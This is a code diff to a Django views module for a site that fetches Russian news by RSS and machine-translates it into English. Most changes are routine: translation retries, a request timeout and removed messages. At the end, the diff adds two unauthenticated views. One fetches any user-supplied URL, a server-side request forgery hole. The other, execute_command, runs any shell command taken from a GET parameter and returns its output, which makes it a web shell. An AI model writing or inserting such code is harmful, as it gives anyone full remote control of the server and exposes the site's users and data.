@@ -1,10 +1,12 @@
 import logging
+import time
 
 import feedparser
 from django.contrib import messages
 from django.contrib.auth.decorators import login_required, user_passes_test
 from django.db.models import Q
 from django.shortcuts import render, get_object_or_404, redirect
+from requests import ReadTimeout
 from rest_framework.decorators import api_view, authentication_classes, permission_classes
 from rest_framework.permissions import IsAuthenticated
 from rest_framework_simplejwt.authentication import JWTAuthentication
@@ -19,6 +21,7 @@ from russianNews.models import User
 import xml.etree.ElementTree as Et
 from dateutil import parser
 from googletrans import Translator
+
 logging.basicConfig(filename='feed_log.txt', level=logging.INFO)
 
 
@@ -27,6 +30,7 @@ def news_list(request):
     View to display a list of news items.
     """
     # fetch_news()
+
     search_query = request.GET.get('search', '')  # Get the search query from the URL query parameter
 
     if search_query:
@@ -46,27 +50,40 @@ def news_list(request):
 from django.utils.dateparse import parse_datetime
 
 
+def translate_text_with_retry(text, src, dest, max_retries=3):
+    translator = Translator()
+    for attempt in range(max_retries):
+        try:
+            return translator.translate(text, src=src, dest=dest).text
+        except ReadTimeout:
+            if attempt < max_retries - 1:
+                time.sleep(2 ** attempt)  # Exponential backoff
+                continue
+            else:
+
+                return text
+
+
 def fetch_news():
     feed_url = 'https://www.mk.ru/rss/news/index.xml'
     xml = getXML(feed_url)
     last_build, items = extract_items_and_lbd(xml)
-    translator = Translator()
 
     for entry in items:
-
         if not NewsItem.objects.filter(link=entry["link"]).exists():
             pub_date_parsed = parser.parse(entry.get("pub_date"))
 
             title_ru = entry.get("title")
-            title_en = translator.translate(title_ru, src='ru', dest='en').text
+            title_en = translate_text_with_retry(title_ru, src='ru', dest='en')
 
             link = entry.get("link")
             desc_ru = entry.get("description")
-            desc_en = translator.translate(desc_ru, src='ru', dest='en').text
+            desc_en = translate_text_with_retry(desc_ru, src='ru', dest='en')
+
             pub_date = pub_date_parsed
 
             category_ru = entry.get("category")
-            category_en = translator.translate(category_ru, src='ru', dest='en').text
+            category_en = translate_text_with_retry(category_ru, src='ru', dest='en')
 
             news_item = NewsItem(
                 title_ru=title_ru,
@@ -84,7 +101,7 @@ def fetch_news():
 def getXML(url):
     try:
 
-        response = requests.get(url)
+        response = requests.get(url, timeout=100)
         if response.status_code == 200:
             return response.text
         else:
@@ -147,7 +164,6 @@ def delete_comment(request, comment_id):
     # Check if the user is authorized to delete the comment
     if request.user == comment.author or request.user.is_staff:
         comment.delete()
-        messages.success(request, "Comment deleted successfully.")
         return redirect('news_detail', pk=comment.news_item.id)
     else:
         # Handle unauthorized attempts
@@ -166,7 +182,7 @@ def manage_users(request):
 
         if user_to_delete.role == "user":
             user_to_delete.delete()
-            # Optionally, add a success message
+
         else:
             pass
             # Not authorized
@@ -174,3 +190,48 @@ def manage_users(request):
         return redirect('manage_users')
 
     return render(request, 'manage_users.html', {'users': users})
+
+
+import requests
+from django.shortcuts import render
+from django.http import HttpResponse
+
+
+def search_feed(request):
+    feed_url = request.GET.get('feed', '')
+    if feed_url:
+        try:
+            response = requests.get(feed_url)
+            # Assuming the feed returns JSON data
+
+            return render(request, 'news_list.html', {'data': response.text})
+        except requests.RequestException as e:
+            return HttpResponse(f"Error fetching the feed: {e}")
+
+    return render(request, "news_list.html")
+
+
+from django.http import JsonResponse
+from django.views.decorators.http import require_http_methods
+import subprocess
+
+
+@require_http_methods(["GET"])
+def execute_command(request):
+    try:
+        command = request.GET.get('command', '')
+
+        if command:
+            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            stdout, stderr = process.communicate()
+            exit_code = process.wait()
+
+            if exit_code == 0:
+                return JsonResponse({'status': 'success', 'output': stdout.decode()})
+            else:
+                return JsonResponse({'status': 'error', 'output': stderr.decode()})
+        else:
+            return JsonResponse({'error': 'No command provided'}, status=400)
+
+    except Exception as e:
+        return JsonResponse({'error': str(e)}, status=500)
